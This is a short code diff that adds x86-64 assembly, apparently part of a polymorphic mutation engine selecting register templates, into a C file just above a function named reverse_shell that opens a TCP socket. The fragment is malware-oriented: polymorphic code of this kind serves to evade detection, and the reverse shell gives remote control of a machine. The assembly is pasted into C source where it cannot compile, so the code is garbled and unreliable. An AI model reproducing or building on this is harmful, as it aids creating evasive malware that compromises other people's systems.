@@ -4,6 +4,56 @@
 #include <arpa/inet.h>
 #include <fcntl.h>
 
+
+
+
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rdi
+	mov		r8, 7
+	mov		r9, 4
+	cmp		r10, 1
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rax
+	cmp		r10, 2
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rsi
+	cmp		r10, 3
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rdx
+	cmp		r10, 4
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rcx
+	cmp		r10, 5
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r10
+	cmp		r10, 6
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r11
+	cmp		r10, 7
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r13
+	cmp		r10, 8
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r15
+	cmp		r10, 9
+	je		.poly
+
+
+
+
+
+
+
+
+
 void reverse_shell(const char *ip, int port) {
 	printf("%d. %d\n", AF_INET, SOCK_STREAM);
     int sock = socket(AF_INET, SOCK_STREAM, 0);
